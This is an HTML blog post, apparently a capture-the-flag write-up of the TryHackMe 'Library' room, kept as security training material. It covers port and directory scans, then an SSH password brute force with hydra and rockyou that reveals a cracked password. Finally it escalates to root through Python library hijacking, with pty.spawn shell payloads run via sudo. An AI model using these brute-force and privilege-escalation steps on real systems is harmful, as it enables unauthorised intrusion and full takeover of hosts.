<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/static/img/favicon.ico" /><title>[THM] Library Writeup - 1</title><meta name="author" content="mirai" /><meta name="description" content="[THM] Library Writeup" /><meta name="keywords" content="[THM] Library Writeup, 1, pentest" /><link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml"><meta content="" property="fb:app_id"><meta content="1" property="og:site_name"><meta content="[THM] Library Writeup" property="og:title"><meta content="article" property="og:type"><meta content="an infosec blog?" property="og:description"><meta content="http://localhost:4000/pentest/2022/03/08/thm-library-writeup.html" property="og:url"><meta content="2022-03-08T00:00:00+08:00" property="article:published_time"><meta content="http://localhost:4000/about/" property="article:author"><meta content="http://localhost:4000/static/img/avatar.jpg" property="og:image"><meta content="pentest" property="article:section"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@jeroldcamacho"><meta name="twitter:creator" content="@jeroldcamacho"><meta name="twitter:title" content="[THM] Library Writeup"><meta name="twitter:url" content="http://localhost:4000/pentest/2022/03/08/thm-library-writeup.html"><meta name="twitter:description" content="an infosec blog?"><link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous"><link rel="stylesheet" href="/static/css/syntax.css"><link href="/static/css/bootstrap.min.css" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:400,300italic,300,400italic,700&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css"><link rel="stylesheet" href="/static/css/super-search.css"><link rel="stylesheet" href="/static/css/thickbox.css"><link rel="stylesheet" href="/static/css/projects.css"><link rel="stylesheet" href="/static/css/main.css"> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '', 'auto'); ga('send', 'pageview'); </script><title>[THM] Library Writeup | 1</title><meta name="generator" content="Jekyll v3.9.2" /><meta property="og:title" content="[THM] Library Writeup" /><meta name="author" content="mirai" /><meta property="og:locale" content="en_US" /><meta name="description" content="Library is a TryHackMe room boot2root machine for FIT and bsides guatemala CTF." /><meta property="og:description" content="Library is a TryHackMe room boot2root machine for FIT and bsides guatemala CTF." /><link rel="canonical" href="http://localhost:4000/pentest/2022/03/08/thm-library-writeup.html" /><meta property="og:url" content="http://localhost:4000/pentest/2022/03/08/thm-library-writeup.html" /><meta property="og:site_name" content="1" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-08T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="[THM] Library Writeup" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"mirai"},"dateModified":"2022-03-08T00:00:00+08:00","datePublished":"2022-03-08T00:00:00+08:00","description":"Library is a TryHackMe room boot2root machine for FIT and bsides guatemala CTF.","headline":"[THM] Library Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/pentest/2022/03/08/thm-library-writeup.html"},"url":"http://localhost:4000/pentest/2022/03/08/thm-library-writeup.html"}</script><body><div class="container"><div class="col-sm-3"><div class="fixed-condition"> <a href="/"><img class="profile-avatar" src="/static/img/avatar.jpg" height="75px" width="75px" /></a><h1 class="author-name">mirai</h1><div class="profile-about"> infosec noob</div><div class="social"><ul><li><a href="https://twitter.com/jeroldcamacho" target="_blank"><i class="fa fa-twitter"></i></a><li><a href="https://github.com/jeroldcamacho" target="_blank"><i class="fa fa-github"></i></a></ul></div><hr /><ul class="sidebar-nav"> <strong>Navigation</strong><li><a href="/">Home</a><li><a class="about" href="/category/bugbounty">Bug Bounty</a><li><a class="about" href="/category/ctf">CTF</a><li><a class="about" href="/category/pentest">Pentest</a><li><a class="about" href="/about/">About Me</a></ul></div></div><div class="col-sm-8 col-offset-1 main-layout"><header class="post-header"><h1 class="post-title">[THM] Library Writeup</h1></header><span class="time">08 Mar 2022</span> <span class="categories"> &raquo; <a href="/category/pentest">pentest</a> </span><div class="content"><div class="post"><p><strong>Library</strong> is a TryHackMe room boot2root machine for FIT and bsides guatemala CTF.<p>Link: <a href="https://tryhackme.com/room/bsidesgtlibrary">https://tryhackme.com/room/bsidesgtlibrary</a><h2 id="recon-phase">Recon Phase</h2><h3 id="nmap">nmap</h3><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@mirai:~# nmap <span class="nt">-T4</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 10.10.85.187 <span class="nt">-Pn</span>
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-08 15:55 HKT
Nmap scan report <span class="k">for </span>10.10.85.187
Host is up <span class="o">(</span>0.24s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc <span class="o">(</span>RSA<span class="o">)</span>
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Welcome to  Blog - Library Machine
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>85.22 seconds
</code></pre></div></div><p>Since port 80 is open, lets do some passive recon on the website.<p><img src="/static/img/thm-library-writeup/user1.png" alt="" /> <img src="/static/img/thm-library-writeup/user2.png" alt="" /><p>I listed down all the usernames I found in the website that is important for later use.<ol><li>meliodas<li>root<li>www-data<li>Anonymous</ol><p>Since there is no other webpages because menu bars is not clickable, lets scan for subdomains.<h3 id="gobuster">gobuster</h3><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@mirai:~# gobuster <span class="nb">dir</span> <span class="nt">-u</span> 10.10.85.187 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt <span class="nt">-x</span> php,txt,html <span class="nt">--timeout</span> 50s <span class="nt">-t</span> 170 <span class="nt">-f</span>
<span class="o">===============================================================</span>
2022/03/08 01:36:48 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/images/              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1640]
/icons/               <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 292]
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5439]
/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 33]
</code></pre></div></div><p>Opening the <code class="language-plaintext highlighter-rouge">robots.txt</code> on the browser gives the following text.<p><img src="/static/img/thm-library-writeup/rockyou.png" alt="" /><p>“rockyou”??? Seems familiar because there’s this famous wordlist named <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, maybe its a hint for us to bruteforce something?<p>Lets try to bruteforce the port 22 (SSH) with hydra!<h3 id="hydra">hydra</h3><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-L</span> meliodas <span class="nb">users</span> <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt ssh://10.10.85.187 <span class="nt">-t</span> 4
</code></pre></div></div><p><img src="/static/img/thm-library-writeup/hydra.png" alt="" /><p>Successfully cracked the credential with a password of <code class="language-plaintext highlighter-rouge">iloveyou1</code><p>Login to the ssh and get the <code class="language-plaintext highlighter-rouge">user.txt</code> flag!<p><img src="/static/img/thm-library-writeup/user3.png" alt="" /><hr /><h1 id="privilege-escalation-meliodas--root">Privilege Escalation: meliodas –&gt; root</h1><h2 id="python-library-hijacking">python library hijacking</h2><p>As you can see when running <code class="language-plaintext highlighter-rouge">sudo -l</code> we can run the file <code class="language-plaintext highlighter-rouge">/home/meliodas/bak.py</code> which was owned by <code class="language-plaintext highlighter-rouge">root</code>.<p><img src="/static/img/thm-library-writeup/sudo.png" alt="" /><p>Lets analyze the code since we cannot modify the python file.<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">zipfile</span>

<span class="k">def</span> <span class="nf">zipdir</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">ziph</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">root</span><span class="p">,</span> <span class="n">dirs</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">walk</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
        <span class="k">for</span> <span class="nb">file</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
            <span class="n">ziph</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="nb">file</span><span class="p">))</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">zipf</span> <span class="o">=</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s">'/var/backups/website.zip'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">,</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">ZIP_DEFLATED</span><span class="p">)</span>
    <span class="n">zipdir</span><span class="p">(</span><span class="s">'/var/www/html'</span><span class="p">,</span> <span class="n">zipf</span><span class="p">)</span>
    <span class="n">zipf</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div><p>The code seems not vunerable to any code injection. So, As I am searching python <code class="language-plaintext highlighter-rouge">zipfile</code> module exploits in google, I came across to this blog post <a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">privilege escalation via python library hijacking</a>.<p>Let’s replicate what he did in the blog post.<ul><li>Create a file <code class="language-plaintext highlighter-rouge">os.py</code> in the same directory as <code class="language-plaintext highlighter-rouge">bak.py</code> and put the contents below.<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">import</span> <span class="nn">pty</span>
  <span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">'/bin/bash'</span><span class="p">)</span>
</code></pre></div></div><li>Run this command <code class="language-plaintext highlighter-rouge">sudo /usr/bin/python3 /home/meliodas/bak.py</code><li><p>see if it works<p><img src="/static/img/thm-library-writeup/os.png" alt="" /></ul><p>It doesnt work with os library, lets repeat the same steps and try it with <code class="language-plaintext highlighter-rouge">zipfile</code> library.<p>And we are now root!<p><img src="/static/img/thm-library-writeup/root.png" alt="" /><h2 id="easiest-way-to-gain-root">Easiest way to gain root</h2><ol><li>Delete the <code class="language-plaintext highlighter-rouge">bak.py</code> file<li>Create a new one and put the contents below<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="nn">pty</span>
 <span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">'/bin/bash'</span><span class="p">)</span>
</code></pre></div></div><li>and run it</ol><p><img src="/static/img/thm-library-writeup/root2.png" alt="" /><p>Thank you!</div><div class="share-page"> <span style="float: left;">Share this on &rarr;&nbsp;&nbsp;</span> <a href="https://twitter.com/share" class="twitter-share-button" data-via="jeroldcamacho">Tweet</a> <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script><div class="fb-share-button" data-href="http://localhost:4000/pentest/2022/03/08/thm-library-writeup.html" data-layout="button_count" style="position: relative; top: -8px; left: 3px;"></div></div><div id="fb-root"></div><script>(function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.6&appId="; fjs.parentNode.insertBefore(js, fjs); }(document, 'script', 'facebook-jssdk'));</script></div><div class="PageNavigation"> <a class="prev" href="/2022/01/19/getting-back-on-the-track.html">&laquo; Getting back on the track</a></div><div class="disqus-comments"><div id="disqus_thread"></div><script type="text/javascript"> /* <![CDATA[ */ var disqus_shortname = ""; var disqus_identifier = "http://localhost:4000_[THM] Library Writeup"; var disqus_title = "[THM] Library Writeup"; /* * * DON'T EDIT BELOW THIS LINE * * */ (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); /* ]]> */ </script></div><footer> &copy; mirai - Powered by Jekyll.</footer></div></div><script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script> <script src="//code.jquery.com/jquery-migrate-1.2.1.min.js"></script> <script src="/static/js/bootstrap.min.js"></script> <script src="/static/js/super-search.js"></script> <script src="/static/js/thickbox-compressed.js"></script> <script src="/static/js/projects.js"></script> <script src="/static//js/lightbox.js"></script><link rel="stylesheet" href="/static/css/lightbox.css">
